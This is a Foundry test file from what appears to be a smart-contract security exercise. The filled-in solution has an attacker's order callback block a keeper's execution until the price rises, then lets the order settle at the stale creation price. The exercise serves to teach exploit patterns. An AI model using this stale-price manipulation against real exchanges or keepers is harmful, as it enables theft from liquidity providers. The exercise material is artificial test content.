// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "src/utils/DummyERC20.sol";
import "src/gas-manipulation-1/TwoStepExchange.sol";
import "src/gas-manipulation-1/AttackContract.sol";

/**
 * @dev run "forge test -vvv --match-contract GM1"
 */
contract TestGM1 is Test {
    event CallbackFailed(uint256 id, string revertMessage, bytes revertData);
    event SwapOrderExecuted(uint256 id, uint256 price);
    event RevertMessageUnparsable(bytes data);
    event ParsedMessage(string message, bytes data);

    address keeper = makeAddr("keeper");
    address attacker = makeAddr("attacker");

    TwoStepExchange exchange;
    DummyERC20 weth;
    DummyERC20 usdc; // Fake USDC, 18 decimals

    uint256 orderCreationBlockNumber;
    uint256 constant ORDER_CREATION_PRICE = 5000 * 1e18;

    function setUp() public {
        weth = new DummyERC20("Fake WETH", "WETH", 1_000_000 * 1e18);
        usdc = new DummyERC20("Fake USDC", "USDC", 1_000_000 * 1e18);

        vm.startPrank(keeper);
        exchange = new TwoStepExchange();
        usdc.balanceOf(keeper); // Prevent prank revert
    }

    function testGasManipulation() public {
        /**
         * CODE YOUR SOLUTION HERE
         */

        // TODO: Implement your AttackContract and then deploy it
        vm.startPrank(attacker);
        AttackContract attackContract = new AttackContract();

        // TODO: Create a malicious order on the Exchange
        address[] memory route = new address[](2);
        route[0] = address(weth);
        route[1] = address(usdc);
        exchange.createSwapOrder(route, 1, address(attackContract));

        /**
         * --- DON'T CHANGE START ---
         */
        // Get the order creation block number
        orderCreationBlockNumber = block.number;

        // The keeper attempts to execute the order, but cannot
        vm.startPrank(keeper);
        vm.expectRevert();
        exchange.executeSwapOrder(1, getKeeperPriceParams(ORDER_CREATION_PRICE, orderCreationBlockNumber));

        // 100 blocks have gone by and the price of Ether has appreciated to $6,000
        vm.roll(100);

        /**
         * --- END OF DON'T CHANGE BLOCK ---
         */

        // TODO: Execute the exploit!
        attackContract.setCanSwap(true);
        /**
         * SUCCESS CONDITIONS
         */

        // Now the keeper successfully executes the order.
        // Why was this an exploit? What were you able to do?
        vm.startPrank(keeper);

        vm.expectEmit();
        emit SwapOrderExecuted(1, ORDER_CREATION_PRICE);

        exchange.executeSwapOrder(1, getKeeperPriceParams(ORDER_CREATION_PRICE, orderCreationBlockNumber));
    }

    function getKeeperPriceParams(uint256 price, uint256 blockNumber)
        public
        pure
        returns (TwoStepExchange.PriceParams memory)
    {
        return TwoStepExchange.PriceParams({price: price, blockNumber: blockNumber});
    }
}
